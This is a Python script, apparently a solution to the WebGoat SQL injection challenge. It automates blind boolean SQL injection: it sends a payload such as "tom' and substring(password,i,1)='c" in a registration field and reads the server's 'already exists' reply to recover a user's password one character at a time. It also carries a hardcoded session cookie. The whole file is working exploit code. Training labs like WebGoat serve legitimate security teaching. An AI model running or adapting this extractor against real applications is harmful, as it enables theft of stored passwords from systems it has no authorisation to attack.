#!/usr/bin/env python
import requests
import json

charset="abcdefghijklmnopqrstuvwxyz0123456789"
def main():
  passu = ""
  for i in range(1,30):
    for c in charset:
      passu += doRequest(i,c)
    print passu
def doRequest(i,c):
  headers = { "Host": "miksi.me:8080", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0", "Accept": "*/*", "Referer": "http://miksi.me:8080/WebGoat/start.mvc", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "60", "Connection": "keep-alive", "Cookie": "JSESSIONID=BBEAF5587B5CFBF87717DFCFBCFF0A22" }

  r = None

  url = 'http://miksi.me:8080/WebGoat/SqlInjection/challenge'
  data1 = {"username_reg" : "tom' and substring(password,"+ str(i) +",1)='" + c, "email_reg" : "email@gmail.com", "password_reg" : "asd", "confirm_password_reg" : "asd"}
  r = requests.put(url, data=data1, headers=headers)

  res = r.text
  if "already exists" in res:
    return c
  else:
    return ""

if __name__=='__main__':
  main()
